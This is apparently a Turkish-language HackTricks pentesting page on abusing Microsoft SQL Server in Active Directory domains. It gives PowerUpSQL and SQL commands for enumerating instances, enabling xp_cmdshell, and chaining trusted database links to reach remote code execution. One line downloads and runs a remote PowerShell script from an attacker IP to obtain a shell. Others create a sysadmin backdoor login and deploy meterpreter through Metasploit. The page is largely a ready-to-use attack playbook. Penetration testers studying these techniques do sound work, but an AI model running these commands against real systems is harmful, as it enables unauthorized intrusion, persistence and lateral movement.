# MSSQL AD Kötüye Kullanımı

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? ya da PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) ya da [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking püf noktalarınızı göndererek PR'ler aracılığıyla paylaşın** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **MSSQL Sıralama / Keşif**

Powershell modülü [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) bu durumda çok faydalıdır.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Etki alanı oturumu olmadan ağdan numaralandırma
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Alan içerisinden numaralandırma
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL Temel Kötüye Kullanım

### Veritabanına Erişim
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL Uzaktan Kod Çalıştırma (RCE)

MSSQL ana bilgisayarında **komutlar** çalıştırmak da mümkün olabilir.
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL Temel Hacking İpuçları

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Güvenilir Bağlantılar

Bir MSSQL örneği, farklı bir MSSQL örneği tarafından güvenilir olarak kabul ediliyorsa (veritabanı bağlantısı). Kullanıcı, güvenilen veritabanı üzerinde ayrıcalıklara sahipse, **güven ilişkisini kullanarak diğer örnekte de sorguları yürütebilecektir**. Bu güvenler zincirlenebilir ve kullanıcı belirli bir noktada yanlış yapılandırılmış bir veritabanı bulabilir ve burada komutları yürütebilir.

**Veritabanları arasındaki bağlantılar, orman güvenlik ilişkileri arasında bile çalışır.**

### Powershell Kötüye Kullanımı
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Metasploit'i kullanarak güvenilir bağlantıları kolayca kontrol edebilirsiniz.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
### Elde Edilebilecek Güvenilir Bağlantıları Bulma

Metasploit'in yalnızca MSSQL'de `openquery()` işlevini kötüye kullanmaya çalışacağını unutmayın (yani, `openquery()` ile komut çalıştıramazsanız komutları yürütmek için **manuel olarak** `EXECUTE` yöntemini denemeniz gerekecektir, aşağıya bakınız.)

### Manuel - Openquery()

**Linux** üzerinden **sqsh** ve **mssqlclient.py** kullanarak bir MSSQL konsol kabuğu elde edebilirsiniz.

**Windows** üzerinden de [**HeidiSQL**](https://www.heidisql.com) gibi bir **MSSQL istemcisi** kullanarak bağlantıları bulabilir ve komutları manuel olarak çalıştırabilirsiniz.

_Windows kimlik doğrulaması kullanarak giriş yapma:_

![](<../../.gitbook/assets/image (805).png>)
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (713).png>)

#### Güvenilir bağlantıda sorguları çalıştırın

Bağlantı üzerinden sorguları çalıştırın (örnek: yeni erişilebilir örnekte daha fazla bağlantı bulun):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Çift ve tek tırnakların nerede kullanıldığını kontrol edin, bu şekilde kullanmak önemlidir.
{% endhint %}

![](<../../.gitbook/assets/image (640).png>)

Bu güvenilir bağlantı zincirini manuel olarak sonsuza kadar devam ettirebilirsiniz.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
### Kılavuz - EXECUTE

`openquery()` içerisinden `exec xp_cmdshell` gibi işlemleri gerçekleştiremiyorsanız `EXECUTE` yöntemini deneyin.
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Yerel Ayrıcalık Yükseltme

**MSSQL yerel kullanıcısı** genellikle **`SeImpersonatePrivilege`** adı verilen özel bir ayrıcalığa sahiptir. Bu, hesabın "kimlik doğrulamadan sonra bir istemciyi taklit etmesine" olanak tanır.

Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu bir sahte veya ara hizmete kimlik doğrulamaya zorlamaktır. Bu sahte hizmet, SİSTEM hizmetini kimlik doğrulamaya çalışırken taklit edebilir.

[SweetPotato](https://github.com/CCob/SweetPotato), bu çeşitli tekniklerin bir koleksiyonunu içerir ve Beacon'ın `execute-assembly` komutu aracılığıyla yürütülebilir.
